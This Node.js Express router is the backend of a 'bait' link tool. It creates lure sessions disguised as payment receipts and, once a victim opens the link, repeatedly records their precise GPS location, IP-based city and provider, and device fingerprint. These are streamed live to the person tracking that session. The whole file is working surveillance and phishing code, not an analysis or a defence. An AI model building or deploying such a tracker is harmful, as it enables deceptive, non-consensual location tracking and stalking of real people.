const express = require('express');
const router  = express.Router();
const { nanoid } = require('nanoid');
const axios   = require('axios');
const BaitSession  = require('../models/BaitSession');
const CaptureEvent = require('../models/CaptureEvent');

// POST /api/bait/create
router.post('/create', async (req, res) => {
  try {
    const { amount, sender, message, mode, imageData } = req.body;
    const sessionId = nanoid(12);
    const session = await BaitSession.create({ sessionId, amount, sender, message, mode: mode || 'receipt', imageData });
    const baitUrl = `${process.env.FRONTEND_URL}/bait/${sessionId}`;
    res.json({ success: true, sessionId, baitUrl, session });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// GET /api/bait/:sessionId
router.get('/:sessionId', async (req, res) => {
  try {
    const session = await BaitSession.findOne({ sessionId: req.params.sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });
    const { imageData, ...safe } = session.toObject();
    res.json({ success: true, session: safe });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/bait/:sessionId/capture
// Called every time watchPosition fires a new location update
router.post('/:sessionId/capture', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const {
      lat, lng, accuracy, altitude, realGPS,
      userAgent, screenW, screenH, language, platform,
      timestamp, updateIndex,
    } = req.body;

    // Get IP
    const rawIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
    const ip = rawIp.startsWith('::ffff:') ? rawIp.slice(7) : rawIp;

    // Parse user agent
    const ua = userAgent || '';
    let device = 'Unknown', browser = 'Unknown', os = 'Unknown';
    if      (ua.includes('iPhone'))   { device = 'iPhone';         os = 'iOS'; }
    else if (ua.includes('iPad'))     { device = 'iPad';            os = 'iPadOS'; }
    else if (ua.includes('Android'))  { device = 'Android';         os = 'Android'; }
    else if (ua.includes('Windows'))  { device = 'Windows PC';      os = 'Windows'; }
    else if (ua.includes('Mac'))      { device = 'Mac';             os = 'macOS'; }
    if      (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Safari') && !ua.includes('Chrome'))      browser = 'Safari';
    else if (ua.includes('Firefox'))  browser = 'Firefox';
    else if (ua.includes('Edg'))      browser = 'Edge';

    // IP geolocation (only on first capture to save API calls)
    let ipCity = '', ipRegion = '', ipCountry = '', ipOrg = '';
    if (updateIndex === 0 || updateIndex === undefined) {
      try {
        const token = process.env.IPINFO_TOKEN;
        if (token && ip !== 'unknown' && !ip.startsWith('127.')) {
          const r = await axios.get(`https://ipinfo.io/${ip}?token=${token}`, { timeout: 3000 });
          ipCity    = r.data.city    || '';
          ipRegion  = r.data.region  || '';
          ipCountry = r.data.country || '';
          ipOrg     = r.data.org     || '';
        }
      } catch (_) {}
    } else {
      // Reuse IP data from first capture to avoid redundant API calls
      const first = await CaptureEvent.findOne({ sessionId }).sort({ timestamp: 1 });
      if (first) { ipCity = first.ipCity; ipRegion = first.ipRegion; ipCountry = first.ipCountry; ipOrg = first.ipOrg; }
    }

    const capture = await CaptureEvent.create({
      sessionId, lat, lng, accuracy, altitude, realGPS, ip,
      ipCity, ipRegion, ipCountry, ipOrg,
      userAgent, device, browser, os, screenW, screenH, language, platform,
      timestamp: timestamp ? new Date(timestamp) : new Date(),
    });

    // Mark session as clicked on first capture
    if (updateIndex === 0 || updateIndex === undefined) {
      await BaitSession.updateOne({ sessionId }, { clicked: true, clickedAt: new Date() });
    }

    const io = req.app.get('io');
    const isFirst = (updateIndex === 0 || updateIndex === undefined);

    // Emit real-time update to the tracker watching this session
    io.to(`session:${sessionId}`).emit('location_captured', {
      sessionId, lat, lng, accuracy, realGPS, ip,
      ipCity, ipRegion, ipCountry, device, browser, os,
      screenW, screenH, language,
      updateIndex: updateIndex || 0,
      isFirst,
      timestamp: capture.timestamp,
    });

    res.json({ success: true, captureId: capture._id });
  } catch (err) {
    console.error('Capture error:', err);
    res.status(500).json({ error: err.message });
  }
});

// GET /api/bait/:sessionId/captures
router.get('/:sessionId/captures', async (req, res) => {
  try {
    const captures = await CaptureEvent.find({ sessionId: req.params.sessionId }).sort({ timestamp: -1 });
    res.json({ success: true, captures });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
